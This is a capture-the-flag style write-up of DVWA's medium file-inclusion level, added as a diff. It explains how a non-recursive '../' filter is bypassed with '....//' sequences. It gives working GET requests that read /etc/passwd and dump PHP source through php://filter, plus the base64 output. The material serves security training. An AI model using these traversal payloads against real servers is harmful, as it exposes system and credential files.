@@ -1,0 +1,66 @@
+#+TITLE: DVWA - File Inclusion Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  Here we introduce a little bit of ~input validation~
+
+  #+begin_src php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\"" ), "", $file );
+
+?>
+  #+end_src
+
+  In particular it tries to remove all sorts of ~http~ and ~https~
+  protocol usage, trying to remove the possibility for a Remote File
+  Inclusion (RFI), and it also replaces ~../~ with the empty string.
+
+* Solution
+  The way the ~../~ character sequence is taken care of is not enough,
+  because the validation is not done recursively. We can create a
+  payload such that, after the initial ~../~ are removed, new ~../~ are
+  formed. One such payload is shown below
+
+  #+begin_example
+....//....//....//....//....//etc/passwd
+  #+end_example
+
+  Notice how when we remove the first bunch of ~../~, others are formed
+
+  #+begin_example
+....// -> ../
+  #+end_example
+
+  therefore we get
+
+  #+begin_example
+../../../../../etc/passwd
+  #+end_example
+
+  In particular, with the following GET we leak the passwd file
+
+  #+begin_example
+http://evil/vulnerabilities/fi/?page=....//....//....//....//....//etc/passwd
+  #+end_example
+
+  and then by also adding the php filters we can also leak the server's php code.
+
+  #+begin_example
+http://evil/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//var/www/html/hackable/flags/fi.php
+  #+end_example
+
+  and we get the following base64
+
+  #+begin_example
+PD9waHAKCmlmKCAhZGVmaW5lZCggJ0RWV0FfV0VCX1BBR0VfVE9fUk9PVCcgKSApIHsKCWV4aXQgKCJOaWNlIHRyeSA7LSkuIFVzZSB0aGUgZmlsZSBpbmNsdWRlIG5leHQgdGltZSEiKTsKfQoKPz4KCjEuKSBCb25kLiBKYW1lcyBCb25kCgo8P3BocAoKZWNobyAiMi4pIE15IG5hbWUgaXMgU2hlcmxvY2sgSG9sbWVzLiBJdCBpcyBteSBidXNpbmVzcyB0byBrbm93IHdoYXQgb3RoZXIgcGVvcGxlIGRvbid0IGtub3cuXG5cbjxiciAvPjxiciAvPlxuIjsKCiRsaW5lMyA9ICIzLikgUm9tZW8sIFJvbWVvISBXaGVyZWZvcmUgYXJ0IHRob3UgUm9tZW8
+  #+end_example
+
+  --------------------
+
+  To get an RFI instead we can use ~php streams~.
